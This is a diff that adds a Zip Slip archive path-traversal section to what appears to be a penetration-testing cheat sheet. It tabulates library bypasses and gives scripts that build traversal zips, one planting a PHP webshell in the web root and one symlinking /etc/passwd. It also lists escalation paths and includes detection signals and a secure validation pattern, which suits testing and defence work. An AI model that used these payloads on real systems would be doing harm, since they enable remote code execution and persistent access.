@@ -144,6 +144,68 @@ C:\Users\<user>\.ssh\id_rsa
 C:\ProgramData\MySQL\MySQL Server 5.7\my.ini
 ```
 
+### Zip Slip / Archive Path Traversal (CWE-22 via extraction)
+
+When the target accepts zip/tar/jar uploads and extracts them server-side:
+
+| # | Library/Language | `../` Blocked? | Bypass | Notes |
+|---|-----------------|---------------|--------|-------|
+| 1 | Node.js `yauzl` (`strictFileNames: true`) | ❌ Only blocks absolute + backslash | `../payload.js` works | `path.join(dest, entry)` resolves traversal |
+| 2 | Node.js `adm-zip` | ❌ No validation | `../../../etc/cron.d/shell` | Direct write anywhere |
+| 3 | Python `zipfile` | ❌ No validation by default | `../payload.py` | Must use `extractall()` with check |
+| 4 | Java `ZipInputStream` | ❌ No validation by default | `../../../WEB-INF/web.xml` | Must manually validate after `getNextEntry()` |
+| 5 | Go `archive/zip` | ❌ No validation by default | `../payload.go` | Must check after `filepath.Join()` |
+| 6 | PHP `ZipArchive::extractTo()` | ✅ Blocks `../` since PHP 7.4.3 | Try `..\\` on Windows | Older PHP versions vulnerable |
+| 7 | Ruby `Zip::File` (rubyzip) | ✅ Since v1.3.0 | Older versions: `../Gemfile` | Check gem version |
+
+**Creating malicious zips:**
+
+```python
+import zipfile, io, base64
+
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+    zf.writestr("../../../tmp/pwned.js", "malicious code here")
+
+# Base64 for web upload
+print(base64.b64encode(buf.getvalue()).decode())
+```
+
+```bash
+# Using zip command (symlink variant)
+ln -s /etc/passwd link
+zip --symlinks evil.zip link
+
+# Using Python to create traversal zip
+python3 -c "
+import zipfile
+with zipfile.ZipFile('evil.zip','w') as z:
+    z.writestr('../../../var/www/html/shell.php','<?php system(\$_GET[\"c\"]);?>')
+"
+```
+
+**Detection signals (target is vulnerable if):**
+- Accepts zip/tar/jar/war uploads
+- Extracts to a known directory structure
+- Uses `path.join()` or string concatenation for destination path
+- No `realpath()` / `path.resolve()` + prefix check after join
+
+**Impact escalation:**
+- Write to web root → RCE via webshell
+- Write to plugins/modules directory → code execution on next load
+- Overwrite config files → auth bypass, credential injection
+- Write to cron.d → scheduled RCE
+- Write SSH authorized_keys → persistent access
+
+**Secure pattern (what to look for as "fixed"):**
+```javascript
+// Node.js — correct validation
+const destpath = path.resolve(dest, entryName);
+if (!destpath.startsWith(path.resolve(dest) + path.sep)) {
+    throw new Error("Path traversal detected");
+}
+```
+
 ### Path Traversal → RCE Escalation
 
 ```bash
